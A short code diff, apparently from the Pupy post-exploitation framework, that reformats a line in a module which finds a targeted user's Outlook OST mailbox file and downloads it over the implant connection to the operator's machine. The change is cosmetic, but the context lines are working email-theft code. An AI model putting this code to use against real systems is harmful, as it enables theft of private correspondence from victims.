@@ -49,7 +49,9 @@ class Outlook(PupyModule):
             self.success("Trying to download Outlook OST file of the targeted current user")
             paths = outlook.getPathToOSTFiles()
             if len(paths)>0:
-                localPath = os.path.join(self.localFolder, ''.join(l for l in paths[0][0].encode('ascii','ignore') if l.isalnum()))
+                localPath = os.path.join(self.localFolder, ''.join(
+                    path for path in paths[0][0].encode('ascii', 'ignore') if path.isalnum())
+                )
                 self.success("Downloading the file {0} to {1}...".format(paths[0][1], localPath))
                 download(self.client.conn, paths[0][1], localPath)
                 self.success("OST file downloaded from {0} to {1}".format(paths[0][1], localPath))
